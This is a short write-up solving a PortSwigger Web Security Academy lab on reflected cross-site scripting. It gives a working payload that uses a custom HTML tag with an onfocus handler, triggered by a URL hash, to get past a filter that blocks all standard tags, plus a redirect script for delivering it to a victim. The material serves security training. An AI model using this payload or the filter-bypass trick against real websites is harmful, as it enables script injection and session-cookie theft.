# Lab 24 — Reflected XSS into HTML context with all tags blocked except custom ones

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

**Entry point:** `?search=` — every standard tag is blocked, **custom**
tags pass; autofocus fires handlers without interaction.

## Solution

1. Custom tags still support events; `#x` focuses the element on load:

```
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

2. Deliver via the exploit server (so the victim loads it):

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

The hash focuses the custom element → `onfocus` fires — lab solved.
